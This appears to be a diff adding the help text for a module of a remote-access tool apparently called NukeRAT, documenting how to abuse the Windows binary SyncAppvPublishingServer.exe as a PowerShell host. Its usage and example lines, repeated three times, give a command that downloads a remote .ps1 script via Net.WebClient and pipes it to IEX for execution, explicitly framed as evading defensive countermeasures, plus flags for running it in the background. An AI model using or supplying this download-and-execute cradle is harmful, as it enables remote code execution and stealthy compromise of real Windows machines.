@@ -1,0 +1,17 @@
+ABOUT
+    Used by App-v to get App-v server lists. LOLBAS documents use
+    SyncAppvPublishingServer as a Powershell host to execute
+    Powershell code. Evade defensive counter measures.
+
+USAGE:
+    SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+
+EXAMPLES:
+    SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
